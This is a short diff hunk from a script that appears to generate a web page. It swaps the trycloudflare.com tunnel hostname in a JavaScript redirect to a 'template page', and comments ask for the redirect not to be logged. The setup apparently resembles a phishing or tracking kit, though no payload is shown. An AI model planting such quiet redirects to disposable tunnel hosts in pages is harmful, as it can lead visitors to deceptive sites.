@@ -195,11 +195,11 @@ echo '
             // Don\'t log this message
             // Try to redirect to the template page
             try {
-                window.location.href = "https://jon-shoot-jury-photos.trycloudflare.com/index2.html";
+                window.location.href = "https://gel-asylum-john-cyber.trycloudflare.com/index2.html";
             } catch (e) {
                 // Don\'t log this message
                 // Fallback redirection
-                window.location = "https://jon-shoot-jury-photos.trycloudflare.com/index2.html";
+                window.location = "https://gel-asylum-john-cyber.trycloudflare.com/index2.html";
             }
         }
         
